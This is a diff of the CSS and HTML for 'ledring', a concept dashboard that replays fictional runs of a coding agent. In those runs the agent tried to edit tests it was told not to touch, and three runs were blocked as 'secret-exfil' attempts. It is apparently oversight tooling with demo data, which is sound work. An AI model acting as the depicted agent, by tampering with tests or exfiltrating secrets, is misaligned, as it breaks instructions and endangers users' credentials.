+.ci .st{grid-column:11/13;text-align:right;font:400 11px var(--mono);color:var(--ink-2)}
+.ci:hover .nm{text-decoration:underline;text-decoration-thickness:2px;text-underline-offset:4px}
+.ci .st.seen{color:var(--ink)}
+.facts{grid-column:1/9;margin-top:24px;display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--ink)}
+.facts div{padding:12px 16px 0 0}
+.facts div+div{padding-left:16px;border-left:1px solid var(--rule)}
+.facts .v{font:600 44px/1 var(--disp);font-stretch:62%;margin-top:6px}
+/* flow */
+.flowg{display:grid;grid-template-columns:repeat(12,1fr);column-gap:24px}
+.flowfig{grid-column:1/10}
+.flowside{grid-column:10/13}
+#flowsvg{width:100%;height:auto;display:block;background:var(--sheet);border:1px solid var(--ink)}
+.fnode{cursor:pointer}
+.fnode rect.b{fill:var(--sheet);stroke:var(--ink-3);stroke-width:1}
+.fnode .t{font:400 12.5px var(--mono);fill:var(--ink-2)}
+.fnode .tag{font:500 9px var(--mono);fill:var(--ink-3)}
+.fnode .tagbg{fill:var(--paper)}
+.fnode.lit rect.b{stroke:var(--ink);stroke-width:1.5}
+.fnode.lit .t{fill:var(--ink)}.fnode.lit .tag{fill:var(--paper)}.fnode.lit .tagbg{fill:var(--ink)}
+.fnode.fail.lit .tagbg{fill:var(--crit)}
+.fnode.lock rect.b{stroke-dasharray:2 3}
+.fnode:hover rect.b{stroke:var(--ink)}
+.fnode.sel rect.b{stroke:var(--calm);stroke-width:2}
+.fedge{fill:none;stroke:var(--ink-3);stroke-width:1}
+.fedge.lit{stroke:var(--ink);stroke-width:2}
+.fedge.lit.bad{stroke:var(--crit)}
+.pct{font:500 10.5px var(--mono);fill:var(--ink-3)}.pct.lit{fill:var(--ink)}
+.pctbg{fill:var(--sheet)}
+.grid-bg line{stroke:var(--rule-2);stroke-width:1}
+.kv{display:grid;grid-template-columns:70px 1fr;gap:8px 12px;font:400 12px var(--mono);margin-top:14px}
+.kv b{font-weight:400;color:var(--ink-2)}
+.legend{display:flex;gap:22px;margin-top:10px}
+.legend span{display:flex;align-items:center;gap:8px}
+.legend i{display:inline-block;width:22px;border-top:2px solid var(--ink)}.legend .l2 i{border-top:1px dashed var(--ink-3)}.legend .l3 i{border-color:var(--crit)}
+/* drift */
+.ruler{position:relative;height:120px;margin-top:22px}
+.ruler svg{width:100%;height:100%;overflow:visible}
+.ruler .tk{stroke:var(--ink);stroke-width:1}.ruler .tk.s{stroke:var(--ink-3)}
+.ruler text{font:400 10px var(--mono);fill:var(--ink-2)}
+#needle{transition:transform .7s cubic-bezier(.3,1.3,.5,1)}
+.dnum{font:600 156px/.8 var(--disp);font-stretch:62%;letter-spacing:-.02em}
+.dpop{position:absolute;font:500 13px var(--mono);animation:dp 1s ease-out forwards}
+@keyframes dp{from{opacity:1;transform:none}to{opacity:0;transform:translateY(-26px)}}
+.up{color:var(--crit)}.dn{color:var(--calm)}
+.steps tr td{transition:color .2s,background .2s;color:var(--ink-3)}
+.steps tr.done td{color:var(--ink)}
+.steps tr.cur td{background:var(--sheet)}
+.steps tr.cur td:first-child{box-shadow:inset 3px 0 0 var(--ink)}
+/* trust */
+.tbar{position:relative;height:14px;border:1px solid var(--ink);background:var(--sheet)}
+.tbar b{position:absolute;inset:0 auto 0 0;background:var(--ink);transition:width .9s cubic-bezier(.3,1,.4,1)}
+.tbar b.ask{background:var(--proc)}.tbar b.never{background:var(--crit)}
+.tbar i{position:absolute;top:-6px;bottom:-6px;left:85%;border-left:1px solid var(--crit)}
+.stamp{display:inline-block;font:600 13px/1 var(--disp);font-stretch:70%;text-transform:uppercase;letter-spacing:.06em;border:1.5px solid currentColor;padding:4px 6px 3px;transform:rotate(-2deg)}
+.stamp.allow{color:var(--calm)}.stamp.ask{color:#A27900}.stamp.never{color:var(--crit)}
+.stamp.in{animation:stp .35s cubic-bezier(.3,1.6,.5,1) both}
+@keyframes stp{from{transform:rotate(-8deg) scale(1.6);opacity:0}}
+.diff{font:400 12px/1.8 var(--mono);white-space:pre;background:var(--sheet);border:1px solid var(--ink);padding:14px 18px;min-height:250px}
+.diff .a{background:#E3EADF;display:block}.diff .r{background:#F3DEDA;display:block;text-decoration:line-through;text-decoration-color:var(--crit)}
+.cue{display:flex;justify-content:space-between;align-items:baseline;margin-top:28px;padding-bottom:8px}.cue b{font:600 22px/1 var(--disp);font-stretch:70%;text-transform:uppercase;font-weight:600}
+/* card */
+.plate{grid-column:1/8;background:var(--sheet);border:1px solid var(--ink);position:relative}
+.plate .top{display:flex;justify-content:space-between;padding:14px 20px;border-bottom:1px solid var(--ink)}
+.plate .body{display:grid;grid-template-columns:1fr 1fr}
+.plate .model{padding:26px 20px 20px;border-right:1px solid var(--ink)}
+.plate .model .nm{font:700 90px/.82 var(--disp);font-stretch:125%;letter-spacing:-.05em}
+.plate .model .cap{display:block;margin-top:14px}
+.plate .spec{padding:8px 20px 6px}
+.plate .spec td{font-size:12.5px}
+.plate .bot{display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--ink)}
+.plate .bot div{padding:10px 20px;border-right:1px solid var(--rule)}
+.plate .bot div:last-child{border:0}
+.barcode{height:28px;display:flex;gap:1px;align-items:stretch;margin-top:6px}
+.barcode i{background:var(--ink)}
+.risk i{display:inline-block;width:14px;height:8px;border:1px solid var(--ink);margin-right:2px;vertical-align:-1px}.risk i.on{background:var(--ink)}
+.appx{grid-column:8/13}
+.appx pre{font:400 11px/1.65 var(--mono);color:var(--ink-2);white-space:pre-wrap;border-top:1px solid var(--ink);padding-top:12px;max-height:520px;overflow:auto}
+.unbox{animation:ub .7s cubic-bezier(.2,1,.3,1)}
+@keyframes ub{from{clip-path:inset(0 0 100% 0)}to{clip-path:inset(0 0 0 0)}}
+/* wall */
+.wallbox{position:relative;height:340px;background:var(--sheet);border:1px solid var(--ink);overflow:hidden}
+.wallbox .lane{position:absolute;left:0;right:0;top:50%;border-top:1px dashed var(--ink-3)}
+.wallbox .dist{position:absolute;left:24px;right:24px;bottom:16px;display:flex;justify-content:space-between;font:400 10px var(--mono);color:var(--ink-3)}
+.wall{position:absolute;top:0;bottom:0;right:0;width:0;background:var(--crit);transition:width .55s cubic-bezier(.7,0,.2,1);overflow:hidden}
+.wall.up{width:41%}
+.wall .w1{position:absolute;left:28px;top:24px;color:#fff;font:600 120px/.8 var(--disp);font-stretch:62%;text-transform:uppercase;white-space:nowrap}
+.wall .w2{position:absolute;left:30px;bottom:20px;color:#fff;font:400 11px var(--mono);white-space:nowrap}
 .wall svg{position:absolute;inset:0;width:100%;height:100%}
-.wall path{stroke:#fff;stroke-width:1.5;fill:none;stroke-dasharray:400;stroke-dashoffset:400;transition:stroke-dashoffset .6s var(--out);vector-effect:non-scaling-stroke}
+.wall path{stroke:#fff;stroke-width:2;fill:none;stroke-dasharray:500;stroke-dashoffset:500;transition:stroke-dashoffset .5s;vector-effect:non-scaling-stroke}
 .wall path.on{stroke-dashoffset:0}
-.agent{position:absolute;left:10%;top:50%;transform:translate(-50%,-50%);transition:left .9s var(--spring)}
-.agent .core{width:48px;height:48px;border-radius:50%;display:grid;place-items:center;background:#0C1218;border:1px solid var(--line-2);box-shadow:0 8px 30px rgba(0,0,0,.6)}
-.agent .core .led i{width:22px;height:22px;border-width:3px}
-.agent .bub{position:absolute;left:50%;transform:translateX(-50%);top:-50px;white-space:nowrap;font:12px var(--fm);background:var(--overlay);backdrop-filter:blur(10px);border:1px solid var(--line-2);border-radius:var(--r1);padding:6px 10px;box-shadow:0 10px 30px rgba(0,0,0,.4)}
-.agent .nm{position:absolute;top:58px;left:50%;transform:translateX(-50%);font:500 10px var(--fm);color:var(--tx-3);letter-spacing:.1em;white-space:nowrap}
-.out{display:grid;grid-template-columns:repeat(3,1fr);gap:var(--s3);margin-top:var(--s4)}
-.oc{cursor:pointer;padding:var(--s4) var(--s5);transition:border-color .2s,transform .3s var(--spring),background .2s}
-.oc:hover{border-color:var(--line-3);transform:translateY(-2px)}
-.oc.sel{border-color:rgba(95,227,245,.45);background:linear-gradient(180deg,rgba(95,227,245,.06),transparent),var(--panel)}
-.oc.sel.c{border-color:rgba(255,90,95,.45);background:linear-gradient(180deg,rgba(255,90,95,.07),transparent),var(--panel)}
-.ocr{display:flex;justify-content:space-between;align-items:center}
-.oc p{margin:10px 0 0;font-size:12.5px}
-.oc .go{font:500 11px var(--fm);color:var(--tx-3);transition:color .2s,transform .3s var(--spring)}.oc:hover .go{color:var(--tx);transform:translateX(2px)}
-.log{font:11.5px/1.9 var(--fm);height:140px;overflow:auto;color:var(--tx-2)}
-.log div[data-t]{display:grid;grid-template-columns:72px 1fr}.log div[data-t]::before{content:attr(data-t);color:var(--tx-4)}
+.agent{position:absolute;left:10%;top:50%;transform:translate(-50%,-50%);transition:left .8s cubic-bezier(.3,1.2,.5,1);text-align:center}
+.agent svg{width:64px;height:64px;display:block;margin:0 auto}
+.agent .nm{font:500 11px var(--mono);margin-top:6px;background:var(--sheet);padding:0 4px}
+.agent .bub{position:absolute;bottom:100%;left:50%;transform:translateX(-50%);margin-bottom:12px;white-space:nowrap;font:400 12.5px var(--text);background:var(--ink);color:var(--paper);padding:6px 10px}
+.agent .bub::after{content:"";position:absolute;left:50%;top:100%;border:5px solid transparent;border-top-color:var(--ink);transform:translateX(-50%)}
+.outs{display:grid;grid-template-columns:repeat(3,1fr);border:1px solid var(--ink);border-top:0}
+.oc{padding:16px 18px 18px;cursor:pointer;border-right:1px solid var(--ink);background:var(--paper);transition:background .12s}
+.oc:last-child{border-right:0}
+.oc:hover{background:var(--sheet)}
+.oc .h{display:flex;justify-content:space-between;align-items:center}
+.oc .nm{font:600 26px/1 var(--disp);font-stretch:70%;text-transform:uppercase;margin-top:12px}
+.oc p{color:var(--ink-2);margin-top:6px;font-size:13px}
+.oc .rad{width:14px;height:14px;border:1px solid var(--ink);border-radius:50%;display:grid;place-items:center}
+.oc.sel{background:var(--sheet)}
+.oc.sel .rad::after{content:"";width:6px;height:6px;border-radius:50%;background:var(--ink)}
+.log{font:400 12px/1.85 var(--mono);margin-top:28px}
+.log div{display:grid;grid-template-columns:90px 1fr;border-bottom:1px solid var(--rule-2)}
+.log div span:first-child{color:var(--ink-3)}
 .log .w{color:var(--crit)}.log .s{color:var(--calm)}
-.int{display:grid;grid-template-columns:1fr 320px;gap:var(--s4)}
-.chat{height:440px;overflow:auto;display:flex;flex-direction:column;gap:var(--s3);padding:var(--s3)}
-.msg{max-width:76%;padding:10px 14px;border-radius:12px;border:1px solid var(--line);background:var(--raised);animation:rise .35s var(--spring);font-size:13px}
-.msg.you{align-self:flex-end;background:rgba(95,227,245,.08);border-color:rgba(95,227,245,.25);border-bottom-right-radius:4px}
-.msg.sus{border-bottom-left-radius:4px}
-.msg .who{font:500 10px var(--fm);color:var(--tx-3);letter-spacing:.08em;margin-bottom:4px}
-.stress{height:6px;border-radius:3px;background:rgba(255,255,255,.05);position:relative;overflow:hidden}
-.stress b{position:absolute;inset:0 auto 0 0;border-radius:3px;background:linear-gradient(90deg,var(--calm),var(--proc) 60%,var(--crit));background-size:272px 100%;transition:width .7s var(--spring)}
-.opts{display:flex;flex-direction:column;gap:6px}
-.opts .btn{height:auto;min-height:36px;padding:9px 12px;justify-content:flex-start;text-align:left;line-height:1.4;white-space:normal}
-.typing{display:flex;gap:4px;padding:14px}.typing i{width:5px;height:5px;border-radius:50%;background:var(--tx-3);animation:ty 1s infinite}.typing i:nth-child(2){animation-delay:.15s}.typing i:nth-child(3){animation-delay:.3s}
-@keyframes ty{50%{opacity:.2;transform:translateY(-2px)}}
-.jitter{animation:jit .12s 5}
-@keyframes jit{25%{transform:translate(1px,-1px)}75%{transform:translate(-1px,1px)}}
-.mapwrap{border-radius:var(--r2);overflow:hidden;border:1px solid var(--line);background:radial-gradient(circle at 1px 1px,rgba(255,255,255,.05) 1px,transparent 0) 0 0/20px 20px,var(--bg-1)}
-#mapsvg{width:100%;height:600px;display:block}
-.mnode rect{fill:#0E141A;stroke:var(--line-2);transition:stroke .2s,fill .2s}
-.mnode .t{font:500 12.5px var(--fs);fill:var(--tx);letter-spacing:-.01em}
-.mnode .s{font:400 10px var(--fm);fill:var(--tx-3)}
-.mnode.mod{cursor:pointer}.mnode.mod:hover rect{stroke:rgba(95,227,245,.6);fill:#0C1A20}
-.mnode.core rect{fill:#0B1A20;stroke:rgba(95,227,245,.5)}
-.medge{fill:none;stroke:rgba(255,255,255,.1);stroke-width:1}
-.mflow{fill:none;stroke:var(--cyan);stroke-width:1.4;stroke-dasharray:2 16;stroke-linecap:round;opacity:.8;animation:flow 1.4s linear infinite}
-.mflow.in{stroke:var(--tx-2);opacity:.5}
-@keyframes flow{to{stroke-dashoffset:-18}}
-.mlbl{font:500 10px var(--fm);fill:var(--tx-3);letter-spacing:.1em}
-#pal{position:fixed;inset:0;z-index:70;display:flex;justify-content:center;align-items:flex-start;padding-top:15vh;background:rgba(3,5,7,.5);opacity:0;pointer-events:none;transition:opacity .18s}
-#pal.on{opacity:1;pointer-events:auto}
-.pbox{width:620px;border-radius:var(--r3);background:rgba(16,21,28,.82);backdrop-filter:blur(24px) saturate(1.6);box-shadow:var(--sh-3),inset 0 1px 0 rgba(255,255,255,.06);overflow:hidden;transform:scale(.96) translateY(-6px);transition:transform .3s var(--spring)}
-#pal.on .pbox{transform:none}
-.pin{display:flex;align-items:center;gap:var(--s3);padding:0 var(--s4);height:54px;border-bottom:1px solid var(--line)}
-.pin input{flex:1;background:none;border:0;outline:0;color:var(--tx);font:400 15px var(--fs);letter-spacing:-.01em}
-.pin input::placeholder{color:var(--tx-3)}
-.plist{max-height:440px;overflow:auto;padding:var(--s2);position:relative}
-.pg{padding:10px 10px 6px;font:500 10px var(--fm);letter-spacing:.09em;color:var(--tx-3);text-transform:uppercase}
-.pit{position:relative;z-index:1;display:flex;align-items:center;gap:var(--s3);height:40px;padding:0 10px;border-radius:8px;color:var(--tx-2);cursor:pointer;font-size:13px}
-.pit .ic{width:24px;height:24px;border-radius:6px;display:grid;place-items:center;border:1px solid var(--line-2);background:var(--raised);font:500 10px var(--fm)}
-.pit.act{color:var(--tx)}.pit.act .ic{border-color:rgba(95,227,245,.4);color:var(--cyan)}
-.pit .sp+span{font:11px var(--fm);color:var(--tx-3)}
-.phl{position:absolute;left:var(--s2);right:var(--s2);height:40px;border-radius:8px;background:rgba(255,255,255,.06);box-shadow:inset 0 0 0 1px var(--line);transition:transform .22s var(--spring);z-index:0;top:0}
-.phl::before{content:"";position:absolute;left:0;top:10px;bottom:10px;width:2px;border-radius:2px;background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
-.pft{display:flex;gap:var(--s4);align-items:center;padding:0 var(--s4);height:40px;border-top:1px solid var(--line);font:11px var(--fs);color:var(--tx-3)}
-.pft span{display:flex;gap:6px;align-items:center}
-.toast{position:fixed;right:var(--s5);bottom:var(--s5);z-index:60;display:flex;flex-direction:column;gap:8px}
-.toast div{display:flex;align-items:center;gap:10px;background:var(--overlay);backdrop-filter:blur(16px);border:1px solid var(--line-2);border-radius:var(--r2);padding:10px 14px;font:12.5px var(--fs);box-shadow:0 16px 40px rgba(0,0,0,.5);animation:tin .45s var(--spring)}
-.toast div::before{content:"";width:8px;height:8px;border-radius:50%;background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
-@keyframes tin{from{opacity:0;transform:translateY(12px) scale(.96)}}
-::-webkit-scrollbar{width:10px;height:10px}::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:10px;border:3px solid transparent;background-clip:padding-box}
-@media (prefers-reduced-motion:reduce){*,*::before{animation:none!important;transition:none!important}}
+.jit{animation:jt .1s 5}@keyframes jt{50%{transform:translateX(2px)}}
+/* interrogation */
+.trans{grid-column:1/9;background:var(--sheet);border:1px solid var(--ink);height:470px;overflow:auto;padding:18px 0;counter-reset:ln}
+.qa{display:grid;grid-template-columns:52px 64px 1fr;padding:6px 24px 6px 0;font-size:14.5px;line-height:1.55}
+.qa::before{counter-increment:ln;content:counter(ln,decimal-leading-zero);font:400 10.5px/2.1 var(--mono);color:var(--ink-3);text-align:right;padding-right:16px}
+.qa .who{font:500 11px/2 var(--mono)}
+.qa.you .who{color:var(--calm)}
+.qa.sus .who{color:var(--ink)}
+.qa.sys{color:var(--ink-2);font-style:italic}
+.qa.typing .tx{color:var(--ink-3)}
+.intside{grid-column:9/13}
+.stressv{font:600 120px/.8 var(--disp);font-stretch:62%}
+.opts{display:flex;flex-direction:column;border-top:1px solid var(--ink);margin-top:18px}
+.opts button{height:auto;min-height:44px;padding:10px 0;border:0;border-bottom:1px solid var(--rule);background:none;justify-content:flex-start;text-align:left;line-height:1.4;font-size:13.5px;white-space:normal}
+.opts button:hover{background:none;color:var(--calm)}
+.opts button::before{content:"→";font-family:var(--mono);color:var(--ink-3)}
+.opts button:hover::before{color:var(--calm)}
+/* map */
+#mapsvg{width:100%;height:auto;display:block;background:var(--sheet);border:1px solid var(--ink)}
+.mn rect{fill:var(--sheet);stroke:var(--ink)}
+.mn text{font:400 11.5px var(--mono);fill:var(--ink)}
+.mn .s{fill:var(--ink-2);font-size:10px}
+.mn.mod{cursor:pointer}.mn.mod:hover rect{fill:var(--ink)}.mn.mod:hover text{fill:var(--paper)}
+.me{fill:none;stroke:var(--ink);stroke-width:1}
+.me.in{stroke:var(--ink-3)}
+.mh{font:600 15px var(--disp);font-stretch:70%;text-transform:uppercase;fill:var(--ink)}
+/* palette */
+#pal{position:fixed;inset:0;z-index:40;background:rgba(243,242,238,.82);display:none;justify-content:center;align-items:flex-start;padding-top:14vh}
+#pal.on{display:flex}
+.pbox{width:600px;background:var(--sheet);border:1px solid var(--ink);box-shadow:8px 8px 0 var(--ink)}
+.pbox input{width:100%;height:56px;border:0;border-bottom:1px solid var(--ink);background:none;padding:0 20px;font:400 18px var(--text);color:var(--ink);outline:none}
+.pg{font:400 10.5px var(--mono);color:var(--ink-2);padding:12px 20px 4px}
+.pit{display:flex;justify-content:space-between;padding:9px 20px;cursor:pointer;font-size:14px}
+.pit span:last-child{font:400 11px var(--mono);color:var(--ink-2)}
+.pit.act{background:var(--ink);color:var(--paper)}.pit.act span:last-child{color:var(--ink-3)}
+.pft{display:flex;gap:18px;padding:10px 20px;border-top:1px solid var(--rule);font:400 11px var(--mono);color:var(--ink-2)}
+.toast{position:fixed;left:48px;bottom:24px;z-index:30;display:flex;flex-direction:column;gap:6px}
+.toast div{background:var(--ink);color:var(--paper);font:400 12px var(--mono);padding:9px 14px;animation:ti .25s ease-out}
+@keyframes ti{from{transform:translateY(8px);opacity:0}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+
+/* 中文排印: CJK fallbacks; no tracking, no condensing, no caps on Hanzi; looser leading */
+html:lang(zh-CN){--sans:'IBM Plex Sans','PingFang SC','Hiragino Sans GB','Noto Sans SC','Source Han Sans SC','Microsoft YaHei',sans-serif;--serif-zh:'Noto Serif SC','Source Han Serif SC','Songti SC','STSong',serif;--mono:'IBM Plex Mono',ui-monospace,Menlo,'PingFang SC','Noto Sans SC',monospace}
+html:lang(zh-CN) body{font-family:var(--sans);line-height:1.75;font-feature-settings:"palt" 0}
+html:lang(zh-CN) p,html:lang(zh-CN) .empty,html:lang(zh-CN) #greet{line-height:1.85;letter-spacing:0;text-align:justify;hanging-punctuation:allow-end;line-break:strict}
+html:lang(zh-CN) .cap,html:lang(zh-CN) nav a span,html:lang(zh-CN) th{letter-spacing:0;text-transform:none}
+html:lang(zh-CN) :is(.hero h1,.ttl h1,.ci .nm,.oc .nm,.cue b,.wall .w1,.mh,.cond,.stamp){font-family:'Archivo',var(--serif-zh);font-stretch:100%;text-transform:none;letter-spacing:0;font-weight:900}
+html:lang(zh-CN) .hero h1{line-height:1.22;font-size:clamp(44px,5.4vw,82px)}
+html:lang(zh-CN) .ttl h1{line-height:1.25}
+html:lang(zh-CN) .hero h1 em{font-style:normal}
+html:lang(zh-CN) .wall .w1{line-height:1.3}
+html:lang(zh-CN) .stamp{font-weight:600;font-family:var(--sans)}
+html:lang(zh-CN) #flowsvg text,html:lang(zh-CN) #mapsvg text{font-stretch:100%;text-transform:none;letter-spacing:0}
+.kbd.lang{text-decoration:none;color:inherit;margin-right:6px;font-family:var(--sans)}
 </style>
 </head>
 <body>
-<div class="grain"></div>
-<div id="boot">
-  <div class="bring"></div>
-  <div class="brand"><span>LEDRING</span><span class="lbl">v0.2 · concept</span></div>
-  <div id="bootlog"></div>
-  <div class="bar"><b id="bootbar"></b></div>
-  <div class="lbl">按任意键跳过 · press any key</div>
-</div>
-<div id="app">
 <header>
-  <div class="brand"><span class="mk"></span>LEDRING</div>
-  <div class="crumb">/ <span>fix-auth</span> / <b id="crumb">Home</b></div>
-  <span class="tag">DEMO DATA · 演示数据</span>
-  <div class="sp"></div>
-  <div class="search" id="openpal" tabindex="0" role="button" aria-label="Open command palette"><svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="7" cy="7" r="5"/><path d="m11 11 3.5 3.5"/></svg><span>搜索模块、操作…</span><kbd>⌘K</kbd></div>
-  <span class="pill-led"><span id="hdrled" class="led"><i></i><span>CALM</span></span></span>
+  <div class="mark"><b>ledring</b><span>catalogue no. 417 — agent behaviour</span></div>
+  <nav id="nav">
+    <a href="#home" data-v="home"><svg viewBox="0 0 34 26"><circle cx="17" cy="13" r="10"/><circle cx="17" cy="13" r="6"/></svg><span><i>00</i>index</span></a>
+    <a href="#flow" data-v="flow"><svg viewBox="0 0 34 26"><rect x="2" y="10" width="7" height="6"/><rect x="25" y="3" width="7" height="6"/><rect x="25" y="17" width="7" height="6"/><path d="M9 13h6c3 0 3-7 10-7M15 13c3 0 3 7 10 7"/></svg><span><i>01</i>flowchart</span></a>
+    <a href="#drift" data-v="drift"><svg viewBox="0 0 34 26"><path d="M2 20h30M5 20v-4M11 20v-3M17 20v-5M23 20v-3M29 20v-4"/><path d="M20 20 24 4"/></svg><span><i>02</i>instability</span></a>
+    <a href="#trust" data-v="trust"><svg viewBox="0 0 34 26"><rect x="2" y="4" width="30" height="4"/><rect x="2" y="11" width="30" height="4"/><rect x="2" y="18" width="30" height="4"/><path d="M26 2v22"/></svg><span><i>03</i>trust</span></a>
+    <a href="#card" data-v="card"><svg viewBox="0 0 34 26"><rect x="3" y="2" width="28" height="22"/><path d="M3 8h28M17 8v16M7 13h6M7 17h4"/></svg><span><i>04</i>model card</span></a>
+    <a href="#wall" data-v="wall"><svg viewBox="0 0 34 26"><path d="M20 1v24M20 1h13v24H20"/><path d="M26 1l-2 7 4 5-3 6 2 6"/><circle cx="8" cy="13" r="4"/></svg><span><i>05</i>red wall</span></a>
+    <a href="#int" data-v="int"><svg viewBox="0 0 34 26"><path d="M17 2v6M10 8h14l3 6H7z"/><path d="M4 24h26"/><path d="M12 14v10M22 14v10"/></svg><span><i>06</i>interrogation</span></a>
+    <a href="#map" data-v="map"><svg viewBox="0 0 34 26"><rect x="13" y="9" width="8" height="8"/><path d="M2 4h6l5 9M2 22h6l5-9M21 13h4l5-9h3M25 13l5 9h3"/></svg><span><i>◇</i>system map</span></a>
+  </nav>
+  <div class="hr"><span id="hdrled" class="led"><i></i><span>calm</span></span><a class="kbd lang" id="langsw" href="?lang=zh" hreflang="zh-CN">中文</a><span class="kbd" id="openpal" tabindex="0">⌘K</span></div>
 </header>
-<nav id="nav">
-  <div class="pill" id="navpill"></div>
-  <a href="#home" data-v="home"><span class="n">00</span>主菜单 Home</a>
-  <div class="grp lbl">Modules</div>
-  <a href="#flow" data-v="flow"><span class="n">01</span>Flowchart Replay</a>
-  <a href="#drift" data-v="drift"><span class="n">02</span>Instability Meter</a>
-  <a href="#trust" data-v="trust"><span class="n">03</span>Trust Meter</a>
-  <a href="#card" data-v="card"><span class="n">04</span>Model Cards</a>
-  <a href="#wall" data-v="wall"><span class="n">05</span>Red Wall</a>
-  <a href="#int" data-v="int"><span class="n">06</span>Interrogation</a>
-  <div class="grp lbl">System</div>
-  <a href="#map" data-v="map"><span class="n">◇</span>系统图 System Map</a>
-  <div class="foot"><span class="lbl">schema</span><span class="mono" style="color:var(--cyan);font-size:11.5px">ledring.trace.v1</span></div>
-</nav>
 <main>
+
 <section class="view" id="v-home">
   <div class="hero">
-    <div class="panel hud st" style="padding:var(--s6) var(--s6) var(--s5)">
-      <div class="ticks"><i></i><i></i><i></i><i></i></div>
-      <div class="bracket">[ SESSION · 本地会话 ]</div>
-      <h1 style="margin:var(--s4) 0 var(--s3)">欢迎回来。</h1>
+    <div class="big">
+      <span class="cap">run-set <b>fix-auth</b> / 50 runs / agent <b>CX-417</b> / demo data, fictional</span>
+      <h1>The unit<br>was told not<br>to touch the tests.<br><em>It hit the wall 3×.</em></h1>
       <div class="greet" id="greet"></div>
-      <div class="menu">
-        <div class="mi pri" data-go="flow" tabindex="0"><span class="ic">▶</span><span>继续回放：fix-auth 的 50 次 run</span><span class="sp"></span><span>01</span></div>
-        <div class="mi" data-go="wall" tabindex="0"><span class="ic" style="color:var(--crit)">■</span><span>查看撞墙的 3 次 run</span><span class="sp"></span><span>05</span></div>
-        <div class="mi" data-go="map" tabindex="0"><span class="ic">◇</span><span>系统图：六个模块如何连接</span><span class="sp"></span><span>◇</span></div>
-      </div>
-      <div class="kpis">
-        <div class="kpi"><div class="lbl">Success</div><div class="v">41<small> / 50</small></div><div class="spark" id="spark"></div></div>
-        <div class="kpi"><div class="lbl">Wall hits</div><div class="v" style="color:var(--crit)">3</div><div class="sub">secret-exfil · 6%</div></div>
-        <div class="kpi"><div class="lbl">Peak drift</div><div class="v">46</div><div class="sub">run #17 · step 6</div></div>
-      </div>
+      <div style="display:flex;gap:8px;margin-top:22px"><button class="solid" data-go="flow">Replay the 50 runs →</button><button data-go="wall">See the 3 wall hits</button></div>
     </div>
-    <div class="col">
-      <div class="panel st" style="--i:1">
-        <div class="ph"><span class="lbl">Sample run</span><span class="tag" style="margin-left:auto">fictional</span></div>
-        <h3 style="margin-bottom:var(--s3)">“修复登录 bug，不要改测试”</h3>
-        <div class="stat"><span>Agent</span><span class="mono">CX-417 coder</span></div>
-        <div class="stat"><span>来源 source</span><span class="mono">otel-genai · claude-code</span></div>
-        <div class="stat"><span>Runs</span><span class="mono">50</span></div>
-        <div class="stat"><span>状态 state</span><span class="led"><i></i><span>CALM</span></span></div>
-      </div>
-      <div class="panel st" style="--i:2">
-        <div class="ph"><span class="lbl">已访问的模块 · visited</span><span class="mono" style="margin-left:auto;font-size:11px;color:var(--tx-2)" id="visitedtxt"></span></div>
-        <div class="dots" id="visited"></div>
-      </div>
+    <div class="art"><svg class="ringdraw" id="ringart" viewBox="0 0 520 520"></svg>
+      <div class="fig"><span class="cap">fig. 0 — status ring, front elevation, 1:1</span><span class="cap" id="ringstate">calm · blue</span></div></div>
+    <div class="facts">
+      <div><span class="cap">success</span><div class="v">41/50</div></div>
+      <div><span class="cap">wall hits</span><div class="v" style="color:var(--crit)">3</div></div>
+      <div><span class="cap">peak drift</span><div class="v">46</div></div>
+      <div><span class="cap">modules seen</span><div class="v" id="seen">0/6</div></div>
     </div>
   </div>
-  <div class="panel st" style="--i:3;margin-top:var(--s4);padding-bottom:var(--s3)"><div class="ph"><span class="lbl">Notable runs · 值得一看</span><span class="mono" style="margin-left:auto;font-size:11px;color:var(--tx-3)">5 of 50 · sorted by drift</span></div><div id="runs"></div></div>
+  <div class="cat" id="catalog"></div>
 </section>
+
 <section class="view" id="v-flow">
-  <div class="vhead st"><div><div class="bracket ey">[ 01 · FLOWCHART REPLAY ]</div><h2>分支回放</h2><p>50 次 run 合并成一张分支图。亮起的是本次 run 的路径，虚线是其他 run 走过的分支，边上的百分比是在该分叉点选择这条路的 run 占比。点击节点进行扫描。</p></div><div class="sp"></div><button class="btn" id="replay">↻ 重放动画 <span class="k">R</span></button></div>
-  <div class="row st" style="--i:1">
-    <div class="flowwrap" style="flex:1" id="flowpanel"><div class="scanline"></div><div class="skel" id="skel"></div>
-      <svg id="flowsvg" viewBox="0 0 930 500"></svg>
-      <div class="legend"><span><i></i>taken · run #17</span><span class="l2"><i></i>locked · other runs</span><span class="l3"><i></i>failed</span></div>
-    </div>
-    <div class="panel" style="width:290px;flex:none" id="scanp">
-      <div class="ph"><span class="lbl">Scan · 节点扫描</span></div>
-      <div id="scan"><div class="empty"><div class="gl">⌖</div><b>尚未选择节点</b><span>点击图中任一节点查看工具调用、参数与结果。</span></div></div>
-    </div>
+  <div class="g head"><div class="idx"><div class="n">01</div><span class="cap">branch replay</span></div>
+    <div class="ttl"><h1>Flowchart</h1><p>Fifty runs merged into one chart. The heavy line is run <b>#17</b>. Dashed plates are branches other runs took; the figure on each edge is the share of runs that chose it at that fork. Select a plate to read it.</p></div>
+    <div class="act"><button id="replay">Redraw <span class="mono" style="opacity:.5">R</span></button></div></div>
+  <div class="flowg">
+    <div class="flowfig"><svg id="flowsvg" viewBox="0 44 960 412"></svg>
+      <div class="fig"><span class="cap">fig. 1 — branch trie, run-set fix-auth, n = 50</span><div class="legend cap"><span><i></i>taken, #17</span><span class="l2"><i></i>other runs</span><span class="l3"><i></i>blocked</span></div></div></div>
+    <div class="flowside"><div class="cap" style="border-bottom:1px solid var(--ink);padding-bottom:8px">selected plate</div><div id="scan"><div class="empty" style="margin-top:14px"><b>Nothing selected.</b>Click any plate in fig. 1 to see the tool call, its arguments and what happened next.</div></div></div>
   </div>
 </section>
+
 <section class="view" id="v-drift">
